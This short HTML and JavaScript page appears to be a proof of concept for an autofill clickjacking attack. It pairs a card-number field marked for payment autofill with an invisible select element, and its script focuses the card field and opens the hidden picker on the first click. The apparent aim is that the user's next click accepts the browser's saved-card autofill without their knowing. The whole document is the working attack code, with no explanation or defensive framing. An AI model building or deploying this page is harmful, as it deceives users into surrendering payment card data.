<input id="card" autocomplete="cc-number" placeholder="Card number">

<select id="select">
    <option>......................</option>
    <option>......................</option>
    <option>......................</option>
    <option>......................</option>
    <option>......................</option>
    <option>......................</option>
    <option>......................</option>
    <option>......................</option>
    <option>......................</option>
    <option>......Fast Click......</option>
    <option>......................</option>
</select>

<style>
#select {
    opacity: 0;
    pointer-events: none;
    position: absolute;
}
</style>

<script>
let pickerShown = false;

document.addEventListener("click", () => {
    const input = document.getElementById("card");
    const select = document.getElementById("select");

    input.focus();

    if (!pickerShown && select.showPicker) {
        try {
            select.showPicker();
            pickerShown = true;
        } catch (e) {
            console.error("showPicker:", e);
        }
    }
});
</script>
